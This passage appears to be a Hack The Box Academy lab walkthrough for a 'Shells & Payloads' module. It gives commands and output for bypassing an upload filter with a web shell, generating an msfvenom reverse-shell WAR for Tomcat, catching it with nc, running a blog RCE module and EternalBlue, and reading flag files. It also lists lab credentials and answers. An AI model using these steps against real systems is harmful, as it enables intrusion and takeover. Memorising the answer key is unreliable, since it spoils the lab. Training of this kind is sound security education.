![Shells_&_Payloads_Walkthrough_Image_26.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_26.png)

![Shells_&_Payloads_Walkthrough_Image_27.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_27.png)

Before forwarding the intercepted request, students need to change the `Content-Type` from `application/x-php` to `image/gif` to bypass the file upload filter:

![Shells_&_Payloads_Walkthrough_Image_28.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_28.png)

![Shells_&_Payloads_Walkthrough_Image_29.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_29.png)

After forwarding the few requests that are related to uploading the web shell, an upload confirmation message will be displayed to the students:

![Shells_&_Payloads_Walkthrough_Image_30.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_30.png)

Students will then need to right-click on the icon of the newly added vendor and click on "Open Image in New Tab":

![Shells_&_Payloads_Walkthrough_Image_31.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_31.png)

At last, students will be able to execute commands on the spawned target machine, and they need to use `ls` to list the files present in the current directory to get the answer:

![Shells_&_Payloads_Walkthrough_Image_32.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_32.png)

Answer: `ajax-loader.gif`

# The Live Engagement

## Question 1

### "What is the hostname of Host-1? \(answer in all lowercase\)"

After spawning the target machine (which is the jump host), students need to connect to it with `xfreerdp` using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:HTB_@cademy_stdnt!
```

```shell-session
┌─[us-academy-1]─[10.10.14.5]─[htb-ac413848@htb-hiwj2sbeuf]─[~]
└──╼ [★]$ xfreerdp /v:10.129.56.215 /u:htb-student /p:HTB_@cademy_stdnt!

[09:22:47:936] [9274:9275] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[09:22:47:937] [9274:9275] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[09:22:47:937] [9274:9275] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[09:22:47:937] [9274:9275] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
[09:22:47:267] [9274:9275] [INFO][com.freerdp.primitives] - primitives autodetect, using optimized

<SNIP>
```

![Shells_&_Payloads_Walkthrough_Image_33.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_33.png)

Subsequently, students need to launch an `Nmap` scan against `Host1`, which has the IP address 172.16.1.11:

![Shells_&_Payloads_Walkthrough_Image_34.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_34.png)

Code: shell

```shell
nmap -A 172.16.1.11
```

```shell-session
┌─[htb-student@skills-foothold]─[~]
└──╼ $nmap -A 172.16.1.11

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-10 04:37 EST
<SNIP>
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=shells-winsvr
| Not valid before: 2022-11-09T09:04:27
|_Not valid after:  2023-05-11T09:04:27
|_ssl-date: 2022-11-10T09:38:09+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: SHELLS-WINSVR
|   NetBIOS_Domain_Name: SHELLS-WINSVR
|   NetBIOS_Computer_Name: SHELLS-WINSVR
|   DNS_Domain_Name: shells-winsvr
|   DNS_Computer_Name: shells-winsvr
|   Product_Version: 10.0.17763
|_  System_Time: 2022-11-10T09:38:04+00:00

<SNIP>
```

From the output of `Nmap` for port 3389, students will know that the host name is `shells-winsvr`.

Answer: `shells-winsvr`

# The Live Engagement

## Question 2

### "Exploit the target and gain a shell session. Submit the name of the folder located in C:\\Shares\\ \(Format: all lower case\)"

From the `Nmap` scan ran in the previous question, students know that port 8080 is open:

Code: shell

```shell
nmap -A 172.16.1.11
```

```shell-session
┌─[htb-student@skills-foothold]─[~]
└──╼ $nmap -A 172.16.1.11

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-10 04:37 EST
Nmap scan report for status.inlanefreight.local (172.16.1.11)
Host is up (0.065s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
<SNIP>
8080/tcp open  http          Apache Tomcat 10.0.11
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/10.0.11
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

```

Therefore, using the previously established RDP session with the jump host, students need to navigate to `http://172.16.1.11:8080` using `Firefox` from within the terminal:

Code: shell

```shell
firefox http://172.16.1.11:8080
```

```shell-session
┌─[htb-student@skills-foothold]─[~]
└──╼ $firefox http://172.16.1.11:8080

```

Once opened, students need to click on "Manager App" and provide the credentials `tomcat:Tomcatadm` (which were provided under "Host-1 hint" in the module's section):

![Shells_&_Payloads_Walkthrough_Image_35.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_35.png)

![Shells_&_Payloads_Walkthrough_Image_36.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_36.png)

After logging to the Application Manager, students will notice that they can upload `.WAR` files:

![Shells_&_Payloads_Walkthrough_Image_37.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_37.png)

Therefore, students need to upload a malicious `.WAR` file that will send them a reverse shell session from the backend server. Students first need to start an `nc` listener that will catch the reverse shell on the jump host:

Code: shell

```shell
nc -nvlp PWNPO
```

```shell-session
┌─[htb-student@skills-foothold]─[~]
└──╼ $nc -nvlp 9001

listening on [any] 9001 ...
```

Then, students need to use `msfvenom`, specifying the payload `java/jsp_shell_reverse_tcp`, `LPORT` to be the port that `nc` is listening on (i.e., `PWNPO`), and most importantly, setting `LHOST` to be the IP address of the jump host. To attain the IP address, students need to use the `ip` command and search for the interface having an address of 172.16.1.\*:

Code: shell

```shell
ip a | grep "172.16.1.*"
```

```shell-session
┌─[htb-student@skills-foothold]─[~]
└──╼ $ip a | grep "172.16.1.*"

    inet 172.16.1.5/23 brd 172.16.1.255 scope global ens224
```

The `ens224` interface has the IP address `172.16.1.5` in here (thus, it will be utilized as `PWNIP`):

Code: shell

```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=PWNIP LPORT=PWNPO -f war -o managerUpdated.war
```

```shell-session
┌─[htb-student@skills-foothold]─[~]
└──╼ $msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=9001 -f war -o managerUpdated.war

Payload size: 1090 bytes
Final size of war file: 1090 bytes
Saved as: managerUpdated.war
```

Students then need to upload and deploy the malicious `.WAR` file to the Application Manager:

![Shells_&_Payloads_Walkthrough_Image_38.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_38.png)

![Shells_&_Payloads_Walkthrough_Image_39.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_39.png)

After deploying it, students need to click on it to notice that the reverse shell connection has been established on the `nc` listener:

![Shells_&_Payloads_Walkthrough_Image_40.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_40.png)

![Shells_&_Payloads_Walkthrough_Image_41.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_41.png)

```cmd-session
connect to [172.16.1.5] from (UNKNOWN) [172.16.1.11] 49799
Microsoft Windows [Version 10.0.17763.2114]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\Apache Software Foundation\Tomcat 10.0>
```

At last, students need to use the `dir` command on the `C:\Shares\` directory, finding the directory `dev-share`:

Code: shell

```shell
dir C:\Shares\
```

```shell-session
C:\Program Files (x86)\Apache Software Foundation\Tomcat 10.0>dir C:\Shares\

dir C:\Shares\
 Volume in drive C has no label.
 Volume Serial Number is 2683-3D37

 Directory of C:\Shares

09/22/2021  12:22 PM    <DIR>          .
09/22/2021  12:22 PM    <DIR>          ..
09/22/2021  12:24 PM    <DIR>          dev-share
               0 File(s)              0 bytes
               3 Dir(s)  26,669,289,472 bytes free
```

Answer: `dev-share`

# The Live Engagement

## Question 3

### "What distribution of Linux is running on Host-2 (Format: distro name, all lower case)"

Using the same previously established RDP session to the jump host, students need to launch an `Nmap` scan against `Host-2`, which has the VHost entry `172.16.1.12 blog.inlanefreight.local` added to `/etc/hosts`:

![Shells_&_Payloads_Walkthrough_Image_42.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_42.png)

Code: shell

```shell
cat /etc/hosts
```

```shell-session
┌─[htb-student@skills-foothold]─[~]
└──╼ $cat /etc/hosts

# Host addresses
127.0.0.1  localhost
127.0.1.1  skills-foothold
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
172.16.1.11  status.inlanefreight.local
172.16.1.12  blog.inlanefreight.local
10.129.201.134  lab.inlanefreight.local
```

Therefore, the `Nmap` scan will be against the VHost `blog.inlanefreight.local`:

Code: shell

```shell
nmap -A blog.inlanefreight.local
```

```shell-session
┌─[htb-student@skills-foothold]─[~]
└──╼ $nmap -A blog.inlanefreight.local

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-10 09:17 EST
Nmap scan report for blog.inlanefreight.local (172.16.1.12)
Host is up (0.066s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f6:21:98:29:95:4c:a4:c2:21:7e:0e:a4:70:10:8e:25 (RSA)
|   256 6c:c2:2c:1d:16:c2:97:04:d5:57:0b:1e:b7:56:82:af (ECDSA)
|_  256 2f:8a:a4:79:21:1a:11:df:ec:28:68:c2:ff:99:2b:9a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Inlanefreight Gabber
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

From the output of `Nmap`, students will see that the the version of the SSH service is exposing the OS's flavour of Linux to be `ubuntu`.

Answer: `ubuntu`

# The Live Engagement

## Question 4

### "What language is the shell written in that gets uploaded when using the 50064.rb exploit?"

Using the previously established RDP session, students can use `searchsploit` to search for `50064.rb` and notice that it references `php`:

Code: shell

```shell
searchsploit 50064.rb
```

```shell-session
┌─[htb-student@skills-foothold]─[~]
└──╼ $searchsploit 50064.rb

-------------------------------------- ---------------------------------
 Exploit Title                        |  Path
-------------------------------------- ---------------------------------
Lightweight facebook-styled blog 1.3  | php/webapps/50064.rb
-------------------------------------- ---------------------------------
```

Alternatively, students can `grep` for `DefaultOptions` to know that the payload is a `php` `meterpreter bind tcp`:

Code: shell

```shell
grep "DefaultOptions" 50064.rb
```

```shell-session
┌─[htb-student@skills-foothold]─[~]
└──╼ $grep "DefaultOptions" 50064.rb 
      'DefaultOptions'  =>
              'DefaultOptions' => {'PAYLOAD'  => 'php/meterpreter/bind_tcp'}
```

Answer: `php`

# The Live Engagement

## Question 5

### "Exploit the blog site and establish a shell session with the target OS. Submit the contents of /customscripts/flag.txt"

Using the previously established RDP session to the jump host, students need to open `blog.inlanefreight.local` with `Firefox`:

Code: shell

```shell
firefox blog.inlanefreight.local
```

```shell-session
┌─[htb-student@skills-foothold]─[~]
└──╼ $firefox blog.inlanefreight.local

```

![Shells_&_Payloads_Walkthrough_Image_43.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_43.png)

When scrolling down within the blog, students will notice that the user "Slade Wilson" has posted that this blog suffers from the [Lightweight facebook-styled blog 1.3 - Remote Code Execution (RCE) (Authenticated)](https://enterprise.hackthebox.com/academy-lab/65984/17660/modules/115/exploit-db.com/exploits/50064) exploit:

![Shells_&_Payloads_Walkthrough_Image_44.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_44.png)

Since the exploit requires authentication, students are given the credentials `admin:admin123!@#` under "Host-2 hint":

![Shells_&_Payloads_Walkthrough_Image_45.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_45.png)

Afterward, students need to launch `msfconsole` and use the `50064.rb` module:

Code: shell

```shell
msfconsole -q
use 50064.rb
```

```shell-session
┌─[htb-student@skills-foothold]─[~]
└──╼ $msfconsole -q

msf6 > use 50064.rb
[*] Using configured payload php/meterpreter/bind_tcp
```

Subsequently, students need to set the module's options accordingly, most importantly setting the `vhost` option to `blog.inlanefreight.local` and setting `RHOST` and `RHOSTS` to `172.16.1.12` (this IP address can be attained by reading `/etc/hosts` of the jump host):

Code: shell

```shell
set VHOST blog.inlanefreight.local
set RHOSTS 172.16.1.12
set RHOST 172.16.1.12
set USERNAME admin
set PASSWORD admin123!@#
```

```shell-session
msf6 exploit(50064) > set VHOST blog.inlanefreight.local

vhost => blog.inlanefreight.local
msf6 exploit(50064) > set RHOSTS 172.16.1.12
RHOSTS => 172.16.1.12
msf6 exploit(50064) > set RHOST 172.16.1.12
RHOST => 172.16.1.12
msf6 exploit(50064) > set USERNAME admin
USERNAME => admin
msf6 exploit(50064) > set PASSWORD admin123!@#
PASSWORD => admin123!@#
```

Then, students need to launch the exploit:

Code: shell

```shell
exploit
```

```shell-session
msf6 exploit(50064) > exploit

[*] Got CSRF token: de5286279a
[*] Logging into the blog...
[+] Successfully logged in with admin
[*] Uploading shell...
[+] Shell uploaded as data/i/4zDx.php
[+] Payload successfully triggered !
[*] Started bind TCP handler against 172.16.1.12:4444
[*] Sending stage (39282 bytes) to 172.16.1.12
[*] Meterpreter session 1 opened (0.0.0.0:0 -> 172.16.1.12:4444) at 2022-11-11 03:07:08 -0500

meterpreter >
```

After attaining the `meterpreter` session successfully, students can read the flag file "flag.txt" which is under the `/customscripts/` directory using `cat`:

Code: shell

```shell
cat /customscripts/flag.txt
```

```shell-session
meterpreter > cat /customscripts/flag.txt

B1nD_Shells_r_cool
```

Alternatively, students can also drop into a system shell then read the flag file:

Code: shell

```shell
shell
cat /customscripts/flag.txt
```

```shell-session
meterpreter > shell

Process 2870 created.
Channel 1 created.
cat /customscripts/flag.txt
B1nD_Shells_r_cool
```

Answer: `B1nD_Shells_r_cool`

# The Live Engagement

## Question 6

### "What is the hostname of Host-3? (answer in all lowercase)"

Using the previously established RDP session to the jump host, students need to launch an `Nmap` scan against `Host-3`, which has the IP address 172.16.1.13:

![Shells_&_Payloads_Walkthrough_Image_46.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_46.png)

Code: shell

```shell
nmap -A 172.16.1.13
```

```shell-session
┌─[htb-student@skills-foothold]─[~]
└──╼ $nmap -A 172.16.1.13

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-11 03:17 EST
Nmap scan report for 172.16.1.13
Host is up (0.069s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: 172.16.1.13 - /
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h39m59s, deviation: 4h37m07s, median: 0s
| smb2-time: 
|   date: 2022-11-11T08:17:26
|_  start_date: 2022-11-11T07:24:16
|_nbstat: NetBIOS name: SHELLS-WINBLUE, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:df:72 (VMware)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: SHELLS-WINBLUE
|   NetBIOS computer name: SHELLS-WINBLUE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-11-11T00:17:26-08:00
```

From the output of `Nmap` for port 445, students will know that the hostname is `shells-winblue`.

Answer: `shells-winblue`

# The Live Engagement

## Question 7

### "Exploit and gain a shell session with Host-3. Then submit the contents of C:\\Users\\Administrator\\Desktop\\Skills-flag.txt"

From the `Nmap` scan ran against 172.16.1.13 (i.e., `Host-3`) in the previous question, students know that the `SMB` ports 139 and 445 are open:

Code: shell

```shell
nmap -A 172.16.1.13
```

```shell-session
┌─[htb-student@skills-foothold]─[~]
└──╼ $nmap -A 172.16.1.13

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-11 03:17 EST
Nmap scan report for 172.16.1.13
Host is up (0.069s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: 172.16.1.13 - /
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h39m59s, deviation: 4h37m07s, median: 0s
| smb2-time: 
|   date: 2022-11-11T08:17:26
|_  start_date: 2022-11-11T07:24:16
|_nbstat: NetBIOS name: SHELLS-WINBLUE, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:df:72 (VMware)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: SHELLS-WINBLUE
|   NetBIOS computer name: SHELLS-WINBLUE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-11-11T00:17:26-08:00
```

The hint provided for this question says that the vulnerability makes many a sysadmin feel "Blue", therefore, it is referring to the `EternalBlue` exploit:

![Shells_&_Payloads_Walkthrough_Image_47.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_47.png)

Therefore, students need to launch `msfconsole` and use the `exploit/windows/smb/ms17_010_psexec` module/exploit:

Code: shell

```shell
msfconsole -q
use exploit/windows/smb/ms17_010_psexec
```

```shell-session
┌─[htb-student@skills-foothold]─[~]
└──╼ $msfconsole -q

msf6 > use exploit/windows/smb/ms17_010_psexec 
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

Subsequently, students need to set the options of the module, most importantly, setting `LHOST` to be the IP address of the jump host. To attain the IP address, students need to use the `ip` command and `grep` for the interface having an address of 172.16.1.\*:

Code: shell

```shell
ip a | grep "172.16.1.*"
```

```shell-session
┌─[htb-student@skills-foothold]─[~]
└──╼ $ip a | grep "172.16.1.*"

    inet 172.16.1.5/23 brd 172.16.1.255 scope global ens224
```

The `ens224` interface has the IP address `172.16.1.5` in here (thus, it will be utilized as `PWNIP`):

Code: shell

```shell
set LHOST PWNIP
set RHOSTS 172.16.1.13
```

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST 172.16.1.5

LHOST => 172.16.1.5
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 172.16.1.13
RHOSTS => 172.16.1.13
```

Then, students need to launch the exploit:

Code: shell

```shell
exploit
```

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 172.16.1.5:4444 
[*] 172.16.1.13:445 - Target OS: Windows Server 2016 Standard 14393
[*] 172.16.1.13:445 - Built a write-what-where primitive...
[+] 172.16.1.13:445 - Overwrite complete... SYSTEM session obtained!
[*] 172.16.1.13:445 - Selecting PowerShell target
[*] 172.16.1.13:445 - Executing the payload...
[+] 172.16.1.13:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 172.16.1.13
[*] Meterpreter session 1 opened (172.16.1.5:4444 -> 172.16.1.13:49671) at 2022-11-11 04:53:16 -0500

meterpreter >
```

After attaining the `meterpreter` session successfully, students can read the flag file "Skills-flag.txt" which is under the `C:\Users\Administrator\Desktop\` directory using `cat`:

Code: shell

```shell
cat C:/Users/Administrator/Desktop/Skills-flag.txt
```

```shell-session
meterpreter > cat C:/Users/Administrator/Desktop/Skills-flag.txt

One-H0st-Down!
```

Alternatively, students can also drop into a system shell then read the flag file:

```cmd
shell
type C:\Users\Administrator\Desktop\Skills-flag.txt
```

```cmd-session
meterpreter > shell

Process 3052 created.
Channel 2 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.
C:\Windows\system32>type C:\Users\Administrator\Desktop\Skills-flag.txt

type C:\Users\Administrator\Desktop\Skills-flag.txt
One-H0st-Down!
```

Answer: `One-H0st-Down!`